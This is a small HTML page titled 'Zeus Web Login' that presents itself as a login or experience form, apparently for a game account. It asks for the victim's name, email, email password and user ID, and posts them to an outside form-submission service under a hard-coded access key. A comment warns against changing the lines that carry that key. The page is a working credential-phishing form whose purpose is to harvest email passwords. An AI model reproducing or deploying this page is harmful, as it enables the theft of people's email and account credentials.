<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Zeus Web Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="sub.css">
</head>
<body>
    <center>
    <div class="container">
        <div class="image">
            <h1>Web Log In</h1>
        </div>
        <form action="https://api.web3forms.com/submit" method="POST">
    <input type="hidden" name="access_key" value="048b26b8-5bce-415f-ba5c-7878cfcccc9f">
    <input type="text" name="ff name" required placeholder="FF Name" class="inp">
    <br>
    <input type="email" name=" ff email" required placeholder="FF Email" class="inp">
    <br>
    <input type="password" name="PSW" required placeholder="Email Password" class="inp">
    <br>
    <input type="phone" name="UID" required placeholder="UID" class="inp">
    <br>
    <textarea name="message" required placeholder="Tell Us About your EXPERIENCE" class="inp"></textarea>
    <br>
    <div class="buttons">
        <button type="submit">
            Submit
            <img src="Check.png" id="sub">  </img>
        </button>
        <button type="reset">
            Reset
            <img src="Restart.png" id="res"> </img>
        </button>
    </div>
</form>
</div>
</center>
</body>
<!-- Don't  Change the line 15 & 16 -->
</html>
